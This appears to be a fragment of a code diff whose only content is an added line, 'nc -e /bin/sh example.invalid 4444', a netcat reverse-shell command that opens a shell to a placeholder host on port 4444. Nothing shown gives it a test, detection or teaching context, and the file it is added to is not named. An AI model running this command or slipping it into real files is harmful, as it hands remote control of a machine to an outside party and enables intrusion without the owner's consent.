@@ -1,0 +1,2 @@
+nc -e /bin/sh example.invalid 4444
+
